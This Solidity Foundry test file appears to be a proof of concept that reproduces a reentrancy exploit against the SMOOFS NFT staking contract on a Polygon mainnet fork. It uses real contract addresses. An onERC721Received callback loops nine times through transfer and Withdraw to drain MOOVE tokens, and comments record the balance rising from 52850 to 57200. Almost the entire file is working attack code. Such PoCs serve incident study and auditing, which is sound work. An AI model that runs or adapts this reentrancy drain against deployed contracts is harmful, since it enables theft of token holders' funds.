// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC721.sol";
import "@interface/IERC20.sol";

interface ISMOOFSStaking {
    function Stake(uint256 _tokenId) external;

    function Withdraw(uint256 _tokenId, bool forceWithTax) external;
}

ISMOOFSStaking constant SMOOFSStaking = ISMOOFSStaking(
    0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C
);
IERC721 constant Smoofs = IERC721(0x551eC76C9fbb4F705F6b0114d1B79bb154747D38);
IERC20 constant MOOVE = IERC20(0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d);
address constant attackContract = 0x367120bf791cC03F040E2574AeA0ca7790D3D2E5;

contract SmoofsStakingTest is Test {
    uint256 constant smoofsTokenId = 2062;
    uint256 setCount;

    function setUp() public {
        vm.createSelectFork("polygon", 54056707);
        vm.label(address(SMOOFSStaking), "SMOOFSStaking");
        vm.label(address(Smoofs), "Smoofs");
        vm.label(address(MOOVE), "MOOVE");
        vm.label(attackContract, "attackContract");

        // For the purpose of this poc transfer Smoofs NFT token from original attack contract
        vm.prank(attackContract);
        Smoofs.transferFrom(attackContract, address(this), smoofsTokenId);

        // print("MOOVE", MOOVE.balanceOf(attackContract), 18);
        // 52850

        // Set initial MOOVE token balance of this contract before attack
        deal(address(MOOVE), address(this), 52850 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        Smoofs.approve(address(SMOOFSStaking), smoofsTokenId);
        MOOVE.approve(address(SMOOFSStaking), type(uint256).max);

        print("MOOVE balance before", MOOVE.balanceOf(address(this)), 18);

        // In my case call to Stake() take some time when I ran POC for the first time.
        SMOOFSStaking.Stake(smoofsTokenId);
        SMOOFSStaking.Withdraw(smoofsTokenId, true);

        print("MOOVE balance after", MOOVE.balanceOf(address(this)), 18);
        // MOOVE balance before: 52850.000000000000000000
        // MOOVE balance after: 57200.000000000000000000
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        operator;
        from;
        tokenId;
        data;

        while (setCount < 9) {
            ++setCount;
            Smoofs.safeTransferFrom(
                address(this),
                address(SMOOFSStaking),
                smoofsTokenId
            );
            SMOOFSStaking.Withdraw(smoofsTokenId, true);
        }
        return this.onERC721Received.selector;
    }
}
